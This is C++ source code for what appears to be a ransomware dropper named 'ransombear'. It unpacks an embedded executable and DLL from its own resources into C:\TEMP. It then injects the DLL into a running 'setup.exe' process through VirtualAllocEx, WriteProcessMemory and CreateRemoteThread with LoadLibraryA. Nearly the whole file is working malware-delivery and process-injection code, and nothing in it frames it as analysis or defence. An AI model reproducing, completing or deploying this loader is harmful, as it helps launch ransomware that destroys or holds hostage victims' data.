#include <Windows.h>
#include <fstream>
#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <cstdio>
#include "resource.h"
#include <filesystem>
#include <tlhelp32.h>
#include <comdef.h>
#include <iostream>

using namespace std;
#define IDB_EMBEDEXE 52
#define IDB_EMBEDDLL 53


using namespace std;

//Create Directory Function
void CreateFolder(const char* path)
{
    if (!CreateDirectory(path, NULL))
    {
        return;
    }
}

//Find target process
int FindTargetProcess(const char* procname) {

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {
        CloseHandle(hProcSnap);
        return 0;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);

    return pid;
}

//Process Injection
int InjectProcess() {

    //process injection
    HANDLE pHandle;
    PVOID remBuf;
    PTHREAD_START_ROUTINE pLoadLibrary = NULL;
    char dll[] = "C:\\TEMP\\LaunchRansombear.dll";
    char target[] = "setup.exe";
    int pid = 0;


    pid = FindTargetProcess(target);
    if (pid == 0) {
        return -1;
    }

    pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");

    pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

    if (pHandle != NULL) {
        remBuf = VirtualAllocEx(pHandle, NULL, sizeof dll, MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(pHandle, remBuf, (LPVOID)dll, sizeof(dll), NULL);
        CreateRemoteThread(pHandle, NULL, 0, pLoadLibrary, remBuf, 0, NULL);

        CloseHandle(pHandle);
    }
    else {
        return -2;
    }
}


int ExtractResource(string fullPath, WORD resourceName) {
    char path[MAX_PATH] = "C:\\TEMP";

    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceName), RT_RCDATA);
    if (!hResource)
        return 1;

    HGLOBAL hGlobal = LoadResource(NULL, hResource);
    if (!hGlobal)
        return 2;

    int exeSiz = SizeofResource(NULL, hResource);
    if (!exeSiz)
        return 3;

    void* exeBuf = LockResource(hGlobal);
    if (!exeBuf)
        return 4;

    char tempPath[MAX_PATH] = {};
    if (!GetTempPathA(MAX_PATH, path))
        return 5;

    //   string fullPath = "C:\\TEMP\\ransombear.exe";
    ofstream outfile(fullPath.c_str(), ios::binary);
    if (!outfile.is_open())
        return 6;

    int res = (outfile.write((char*)exeBuf, exeSiz)) ? 0 : 7;
    outfile.close();
}

int main() {

    string fullPathEXE = "C:\\TEMP\\ransombear.exe";
    string fullPathDLL = "C:\\TEMP\\LaunchRansombear.dll";

    //Create Temp Directory
    CreateFolder("C:\\TEMP\\");

    //Extract Resource
    ExtractResource(fullPathEXE, IDB_EMBEDEXE);
    ExtractResource(fullPathDLL, IDB_EMBEDDLL);

    //Inject
    InjectProcess();
}